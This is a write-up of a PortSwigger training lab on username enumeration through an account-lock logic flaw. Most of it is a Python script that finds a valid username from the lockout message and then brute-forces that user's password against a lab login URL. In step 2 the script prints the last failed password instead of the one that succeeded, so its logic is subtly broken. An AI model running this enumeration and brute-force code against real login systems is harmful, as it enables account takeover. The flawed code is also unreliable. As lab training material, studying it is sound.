# Lab: Username enumeration via account lock

## Lab

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

[Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
[Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Hint

None

## Solution

In the previous lab, we knew that the account will be locked if we login fail more than 3 times. This is still kept until this lab.

Step 1: Find out which username is valid by way brute force list of usernames.
```Python
import requests
from tqdm import tqdm
url = 'https://0a26002504a02003c20509c9001800cc.web-security-academy.net/login'

#Step 1:
usernames = open('../shortlist/usernames.txt', 'r').read().splitlines()
usernameValid = ''
for username in tqdm(usernames):
    for i in range(5):
        data = {
            'username': username,
            'password': 'password'
        }
        response = requests.post(url, data=data)
        
        if 'too many incorrect login' in response.text:
            usernameValid = username
            print(username)
            break
    if usernameValid != '':
        break
#Step 2:
passwords = open('../shortlist/passwords.txt', 'r').read().splitlines()
passwordValid = ''
for password in tqdm(passwords):
    data = {
        'username': usernameValid,
        'password': password
    }
    
    response = requests.post(url, data=data)
    if 'Invalid username or password' in response.text or 'too many incorrect login' in response.text:
        passwordValid = password
        continue
    else:
        print(passwordValid)
        break
```

Logic flaw in here is that the username is invalid won't be returned `You have made too many incorrect login attempts. Please try again in 1 minute(s).` Just only the valid username will be returned that string if we login incorrect more than 3 times. With invalid username although we login incorrect more than 3 times, the response is still `Invalid username or password.`

Depending on that we try 5 times (more than 3 times) login with each username. Response will be returned `too many incorrect`, if that username is valid. We save `usernameValid` and break the for loop.

Step 2: Brute-forcing password with usernameValid

Use `usernameValid` brute-force this with list password is provided by the lab.

So that we had solved this lab.




